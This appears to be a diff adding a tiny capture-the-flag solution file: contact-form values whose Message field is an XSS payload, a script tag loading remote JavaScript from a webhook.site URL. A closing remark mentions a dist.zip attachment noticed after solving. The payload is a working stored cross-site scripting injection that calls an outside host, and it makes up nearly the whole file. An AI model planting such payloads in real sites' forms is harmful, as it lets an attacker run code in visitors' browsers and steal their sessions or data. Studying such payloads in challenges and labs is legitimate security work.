@@ -1,0 +1,5 @@
+Name: asd
+Email: asd@gmail.com
+Message: <script src="https://webhook.site/1c54960e-ef0f-49d0-bee5-98f675847ab1/"></script>
+
+Somehow only noticed the `dist.zip` attachment after solving...
